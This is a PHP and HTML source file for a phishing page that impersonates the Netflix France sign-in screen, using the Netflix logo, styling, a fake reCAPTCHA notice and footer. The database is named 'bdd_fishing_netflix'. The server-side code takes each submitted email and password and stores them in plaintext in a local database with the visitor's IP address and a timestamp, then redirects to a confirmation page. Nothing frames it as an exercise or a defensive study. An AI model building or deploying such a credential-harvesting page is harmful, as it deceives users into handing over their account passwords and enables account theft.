<?php
// Activation des erreurs pour le débogage
ini_set('display_errors', 1);
error_reporting(E_ALL);

// Connexion à la base de données
$servername = "localhost";
$username = "root";
$password = "root"; // Met "root" si t'es sur Mac, "" si t'es sur Windows
$dbname = "bdd_fishing_netflix";

try {
    $conn = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch(PDOException $e) {
    die("Erreur de connexion : " . $e->getMessage());
}

// Traitement du formulaire
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['email']) && isset($_POST['password'])) {
    
    $email = $_POST['email'];
    $password_text = $_POST['password'];
    $remember = isset($_POST['remember']) ? 1 : 0;
    $date = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'];
    
    try {
        // Insertion dans la base
        $sql = "INSERT INTO connexions (email, password, remember_me, date_connexion, ip_address) 
                VALUES (:email, :password, :remember, :date_connexion, :ip)";
        
        $stmt = $conn->prepare($sql);
        $stmt->execute([
            ':email' => $email,
            ':password' => $password_text,
            ':remember' => $remember,
            ':date_connexion' => $date,
            ':ip' => $ip
        ]);
        
        // Redirection vers la page de confirmation
        header("Location: confirmation.php");
        exit();
        
    } catch(PDOException $e) {
        echo "Erreur lors de l'insertion : " . $e->getMessage();
    }
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix France</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
        }
        
        body {
            background-color: #000;
            color: #fff;
        }
        
        .background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('netflix.jpg');
            background-size: cover;
            background-position: center;
            z-index: -1;
        }
        
        .header {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            padding: 20px 50px;
            z-index: 10;
        }
        
        .logo {
            width: 150px;
            height: 40px;
        }
        
        .logo svg {
            width: 100%;
            height: 100%;
            fill: #e50914;
        }
        
        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .login-box {
            background-color: rgba(0, 0, 0, 0.75);
            border-radius: 4px;
            padding: 60px 68px 40px;
            width: 450px;
            max-width: 100%;
        }
        
        h1 {
            font-size: 32px;
            margin-bottom: 28px;
        }
        
        .form-group {
            margin-bottom: 16px;
            position: relative;
        }
        
        input {
            width: 100%;
            height: 50px;
            padding: 16px 20px 0;
            font-size: 16px;
            background-color: #333;
            border: none;
            border-radius: 4px;
            color: #fff;
            outline: none;
        }
        
        input:focus {
            background-color: #454545;
        }
        
        label {
            position: absolute;
            top: 50%;
            left: 20px;
            transform: translateY(-50%);
            color: #8c8c8c;
            font-size: 16px;
            transition: all 0.2s ease;
            pointer-events: none;
        }
        
        input:focus + label,
        input:not(:placeholder-shown) + label {
            top: 7px;
            font-size: 11px;
        }
        
        button {
            width: 100%;
            height: 50px;
            background-color: #e50914;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 700;
            margin-top: 24px;
            margin-bottom: 12px;
            cursor: pointer;
        }
        
        button:hover {
            background-color: #f40612;
        }
        
        .remember-help {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 10px;
            font-size: 13px;
            color: #b3b3b3;
        }
        
        .remember {
            display: flex;
            align-items: center;
        }
        
        .remember input {
            width: auto;
            height: auto;
            margin-right: 5px;
        }
        
        .help a {
            color: #b3b3b3;
            text-decoration: none;
        }
        
        .help a:hover {
            text-decoration: underline;
        }
        
        .signup {
            margin-top: 16px;
            color: #737373;
        }
        
        .signup a {
            color: #fff;
            text-decoration: none;
        }
        
        .signup a:hover {
            text-decoration: underline;
        }
        
        .captcha {
            margin-top: 10px;
            font-size: 13px;
            color: #8c8c8c;
        }
        
        .captcha a {
            color: #0071eb;
            text-decoration: none;
        }
        
        footer {
            background-color: rgba(0, 0, 0, 0.75);
            padding: 30px 0;
            margin-top: 80px;
        }
        
        .footer-content {
            max-width: 1000px;
            margin: 0 auto;
            padding: 0 20px;
        }
        
        .footer-top {
            margin-bottom: 30px;
        }
        
        .footer-top a {
            color: #737373;
            text-decoration: none;
        }
        
        .footer-links {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 12px;
            margin-bottom: 20px;
        }
        
        .footer-links a {
            font-size: 13px;
            color: #737373;
            text-decoration: none;
        }
        
        .footer-links a:hover {
            text-decoration: underline;
        }
        
        .language-selector {
            margin-bottom: 20px;
        }
        
        select {
            background-color: #000;
            color: #737373;
            border: 1px solid #333;
            padding: 12px 26px 12px 14px;
            font-size: 14px;
            border-radius: 2px;
            appearance: none;
            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'%3e%3cpath d='M7 10l5 5 5-5z'/%3e%3c/svg%3e");
            background-repeat: no-repeat;
            background-position: right 10px center;
            background-size: 12px;
        }
        
        .footer-country {
            font-size: 13px;
            color: #737373;
        }
    </style>
</head>
<body>
    <div class="background"></div>
    
    <header class="header">
        <div class="logo">
            <svg viewBox="0 0 111 30">
                <path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2499766 C43.7810479,26.2499766 42.1876465,26.2499766 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z"></path>
            </svg>
        </div>
    </header>

    <div class="container">
        <div class="login-box">
            <h1>S'identifier</h1>
            
            <form method="POST">
                <div class="form-group">
                    <input type="email" id="email" name="email" required placeholder=" ">
                    <label for="email">E-mail ou numéro de téléphone</label>
                </div>
                <div class="form-group">
                    <input type="password" id="password" name="password" required placeholder=" ">
                    <label for="password">Mot de passe</label>
                </div>
                <button type="submit">S'identifier</button>
                <div class="remember-help">
                    <div class="remember">
                        <input type="checkbox" id="remember" name="remember">
                        <label for="remember">Se souvenir de moi</label>
                    </div>
                    <div class="help">
                        <a href="#">Besoin d'aide ?</a>
                    </div>
                </div>
                <div class="signup">
                    <p>Première visite sur Netflix ? <a href="#">Inscrivez-vous</a>.</p>
                </div>
                <div class="captcha">
                    <p>Cette page est protégée par Google reCAPTCHA pour nous assurer que vous n'êtes pas un robot. <a href="#">En savoir plus</a>.</p>
                </div>
            </form>
        </div>
    </div>

    <footer>
        <div class="footer-content">
            <div class="footer-top">
                <p>Des questions ? Appelez le <a href="tel:(+33) 0805-543-063">(+33) 0805-543-063</a></p>
            </div>
            <div class="footer-links">
                <a href="#">FAQ</a>
                <a href="#">Centre d'aide</a>
                <a href="#">Conditions d'utilisation</a>
                <a href="#">Confidentialité</a>
                <a href="#">Préférences de cookies</a>
                <a href="#">Mentions légales</a>
                <a href="#">Choix liés à la pub</a>
            </div>
            <div class="language-selector">
                <select>
                    <option>Français</option>
                    <option>English</option>
                </select>
            </div>
            <div class="footer-country">
                <p>Netflix France</p>
            </div>
        </div>
    </footer>
</body>
</html>